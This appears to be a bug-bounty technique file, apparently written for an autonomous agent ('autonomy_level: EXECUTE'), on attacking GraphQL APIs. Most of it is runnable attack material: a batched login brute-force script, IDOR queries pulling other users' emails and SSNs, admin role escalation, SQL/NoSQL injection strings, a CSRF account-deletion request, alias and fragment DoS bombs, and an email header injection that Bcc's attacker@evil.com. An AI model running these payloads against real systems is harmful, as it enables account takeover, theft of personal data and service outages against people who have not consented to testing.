---
title: GraphQL Abuse
created: 2026-03-10
tags: [skills-learned, cyber, graphql]
type: technique
payout_ceiling: $10K–$25K (BOLA/IDOR, batching abuse, injection via resolvers)
auth_required: NO (introspection, batching) / YES (IDOR, mutation abuse)
autonomy_level: EXECUTE
---

# GraphQL Abuse

## Concept

> **Directive attacks:** This file covers standard GraphQL abuse (introspection, batching, IDOR, injection). For directive injection and deception attacks (`@skip`/`@include` bypass, custom directive injection, alias-based bypass), load **`graphql-directive-fuzzer.md`** in addition. EV: $2K–$15K per confirmed directive auth bypass.

GraphQL is a query language for APIs. Misconfigurations lead to: introspection schema leakage, batching attacks (rate limit bypass), authorization flaws (BOLA/IDOR), injection via unsanitized resolver args, and DoS via deeply nested queries.

**Endpoint locations (try all):**
```
/graphql
/api/graphql
/gql
/graph
/v1/graphql
/query
```

**Primary Burp tool:** InQL extension (BApp Store) — auto-generates all queries/mutations from schema

---

## Detection & Reconnaissance

### Fingerprint GraphQL
```bash
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}' | jq .
```

### Introspection dump (if enabled)
```bash
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { types { name fields { name type { name kind ofType { name kind } } } } } }"
  }' | jq . > schema.json
```

### Bypass disabled introspection

**Field suggestion enumeration (works even without introspection on most servers):**
```bash
# Most servers leak "Did you mean X?" suggestions even with introspection off
{"query": "{ usr { id } }"}
# Response: "Did you mean 'user'?" → enumerate fields via typos

# Clairvoyance — automates field suggestion enumeration:
pip3 install clairvoyance --break-system-packages
clairvoyance https://target.com/graphql -o schema.json
```

**`__type` instead of `__schema`:**
```bash
{"query": "{ __type(name: \"User\") { fields { name } } }"}
```

### Endpoint discovery
```bash
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/graphql.txt \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}' \
  -fr "not found"
```

---

## Exploitation

### Batching — rate limit bypass (brute force via single HTTP request)
```json
[
  {"query": "mutation { login(user:\"admin\", pass:\"pass1\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"pass2\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"pass3\") { token } }"}
]
```
Send 100–1000 mutations in a single HTTP request → bypass per-request rate limiting.

### BOLA/IDOR — query other users' objects
```graphql
query {
  user(id: "2") {
    email
    phone
    ssn
  }
}

# Bulk enumeration via aliases:
query {
  u1: user(id: "1") { email }
  u2: user(id: "2") { email }
  u3: user(id: "3") { email }
}
```

### Mutation privilege escalation
```graphql
mutation {
  updateUser(id: "victim-id", role: "admin") {
    id
    role
  }
}
```

### SQL/NoSQL injection via resolver args
```graphql
query {
  user(name: "admin' OR '1'='1") { id email }
}

# MongoDB resolver:
query {
  user(filter: {"$gt": ""}) { id email }
}
```

### GraphQL CSRF via Content-Type switch
```bash
# Some GraphQL endpoints accept application/x-www-form-urlencoded
# This allows CSRF since browser doesn't send preflight for simple content types
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'query=mutation{deleteAccount(id:"victim")}'
```

### Nested query DoS (no depth/cost limit)
```graphql
query {
  a: user(id:1) { friends { friends { friends { friends { id } } } } }
  b: user(id:1) { friends { friends { friends { friends { id } } } } }
  # repeat 50x
}
```

---

## Tools & Terminal

```bash
# InQL — Burp extension (primary tool)
# Install: Burp → Extensions → BApp Store → InQL
# Usage: InQL tab → paste endpoint → Generate → browse all queries/mutations

# graphql-cop — security audit tool
pip3 install graphql-cop --break-system-packages
graphql-cop -t https://target.com/graphql
# Checks: introspection, batching, field suggestions, DoS, CSRF

# gqlspection — introspection + schema analysis
pip3 install gqlspection --break-system-packages
gqlspection -u https://target.com/graphql

# clairvoyance — schema enumeration without introspection
pip3 install clairvoyance --break-system-packages
clairvoyance https://target.com/graphql -o schema.json

# Batch brute force with Python:
python3 - <<'EOF'
import requests, json
url = "https://target.com/graphql"
batch = [{"query": f'mutation {{ login(user:"admin", pass:"pass{i}") {{ token }} }}'}
         for i in range(100)]
r = requests.post(url, json=batch, headers={"Content-Type": "application/json"})
print(r.text[:2000])
EOF

# Check for exposed playground:
curl https://target.com/graphiql   # built-in IDE
curl https://target.com/playground
```

---

## Bypass / Edge Cases

- `Content-Type: application/x-www-form-urlencoded` bypasses WAF rules tuned for JSON
- `GET` method with `?query=` param often works and bypasses POST-only rate limits
- Persisted queries — server may only accept pre-registered query hashes (check for persisted query endpoints)
- WebSocket subscriptions — different auth path, often less protected than HTTP queries
- Fragments may bypass depth-limit checks (cost analysis doesn't count fragment expansion)

---

## Persisted Query Enumeration

Many GraphQL deployments (Apollo, Relay) use persisted queries to restrict schema access. These are pre-registered query hashes. But the registration process often has gaps.

```bash
# Check for Apollo persisted query endpoint
GET /graphql?extensions={"persistedQuery":{"version":1,"sha256Hash":"HASH"}}
→ Response: {"errors":[{"message":"PersistedQueryNotFound"}]} = APQ enabled
→ Response: {"data":...} = cache hit (hash maps to a real query)

# Enumerate known hash patterns
# Apollo APQ hashes are SHA-256 of the query string
# Common queries to hash-and-try:
python3 -c "import hashlib; print(hashlib.sha256(b'{__typename}').hexdigest())"
# → Try {__typename}, {viewer{id}}, {me{email}}, {users{id,email,role}}

# If server accepts unregistered hashes (no restriction):
POST /graphql
{"query": "{users{id email password}}", "extensions":{"persistedQuery":{"version":1,"sha256Hash":"COMPUTED_HASH"}}}
→ Returns data? = APQ not enforced → introspection bypass via APQ path

# Fuzz for registered hashes (timing-based):
# Registered hash → fast response (cache hit)
# Unregistered hash → slower (PersistedQueryNotFound)
# Timing differential identifies valid query hashes
```

**Filing:** If APQ endpoint allows new query registration without allowlist = unauthorized schema query execution. Medium-High ($1K–$10K).

---

## Fragment Cost-Analysis Bypass

GraphQL depth and complexity limits (query cost analysis) are designed to prevent expensive queries. Fragments are often excluded from the cost counter.

```graphql
# Direct deep nesting (blocked by depth limit):
{user{friends{friends{friends{id email}}}}}

# Fragment-based bypass:
fragment F on User { friends { ...F } }
{ user { ...F } }
# Fragment expansion creates identical nesting but bypasses depth counter
# Some implementations count fragment depth separately (correctly)
# Others count only the spread, not the expansion (vulnerable)

# Cost-analysis bypass via inline fragments:
{
  user {
    ... on User {
      ... on User {
        ... on User {
          friends { id email password }
        }
      }
    }
  }
}

# Test: compare response time — if fragment query is slower than direct blocked query
# → Cost analysis is counting differently for fragments
```

**Filing:** If fragment bypass allows denial-of-service or bypasses authorization cost limits = Medium ($1K–$5K). If data exfil via bypassed resolver = High.

---

## Alias Recursion DoS

Aliases allow the same field to be requested multiple times with different names in one query. Without alias limits, this enables amplification.

```graphql
# Alias bomb — single request, 1000 resolver calls:
{
  a1:user(id:1){id email}
  a2:user(id:1){id email}
  a3:user(id:1){id email}
  # ... repeat 1000 times
  a1000:user(id:1){id email}
}

# Automated alias bomb generation:
python3 -c "
fields = '\n'.join([f'  a{i}:user(id:1){{id email}}' for i in range(1000)])
print('{\n' + fields + '\n}')
" > alias-bomb.graphql

curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @alias-bomb.graphql

# Measure response time: >10s = DoS vector confirmed
# Measure server CPU spike: check response headers or timing
```

**IMPORTANT:** DoS findings require confirmation that the endpoint is NOT rate-limited AND that the resource exhaustion is meaningful. Verify with 2 concurrent requests before claiming DoS. Do NOT hammer the endpoint.

**Filing:** Alias-based DoS = Medium ($500–$5K). Must show actual server resource impact. Most programs require "significant" resource exhaustion — note response time in POC.

---

## Custom Scalar Type Poisoning

GraphQL custom scalars (DateTime, JSON, Upload, Email) are validated by resolver code. Poorly implemented scalars accept unexpected types and cause backend confusion.

```graphql
# Discover custom scalars via introspection:
{__schema{types{name kind}}}
# Look for: DateTime, JSON, Upload, Email, UUID, BigInt, URL

# Type confusion attacks:

# 1. JSON scalar injection (if server deserializes JSON scalar into object):
mutation {
  updateProfile(data: {bio: "{\"__proto__\":{\"admin\":true}}"})
  # OR pass actual object instead of string:
  updateProfile(data: {bio: {__proto__: {admin: true}}})
}

# 2. DateTime scalar overflow:
mutation {
  setExpiry(date: "9999-12-31T23:59:59.999Z")  # far-future date
  setExpiry(date: "-1")                          # negative timestamp
  setExpiry(date: "2024-13-45")                  # invalid month/day
}

# 3. Upload scalar (multipart) — substitute non-file value:
# Expected: multipart/form-data with file
# Attack: send {"query":"mutation{uploadFile(file:null)}"} without file
# → Null dereference in resolver? = potential RCE vector

# 4. Email scalar bypass:
mutation { register(email: "test@test.com\nBcc: attacker@evil.com") }
# Email header injection if scalar not sanitizing newlines

# 5. BigInt/Integer overflow:
mutation { transfer(amount: 9999999999999999999) }
# → Causes integer overflow on backend? = business logic bypass
```

**Filing:** Type confusion → business logic bypass = Medium-High. Email header injection via scalar = High. Prototype pollution via JSON scalar = High-Critical.

---

## Filing Guidance

**Introspection enabled + sensitive types exposed:** Low ($2K–$5K) — shows schema to attacker but no direct impact
**Batching rate limit bypass:** Medium ($10K) — show brute force possible (OTP bypass, credential stuffing)
**BOLA/IDOR via query:** High ($25K) — show unauthorized access to another user's data
**Injection via resolver:** High–Critical ($25K–$50K+) — SQLi/NoSQL in GraphQL arg = high impact
**CSRF via content-type:** Medium ($5K–$10K) — show mutation executes without CSRF token

---

*GraphQL Abuse v1.0 | Ingested 2026-03-10 | Owner: cyber-operator*
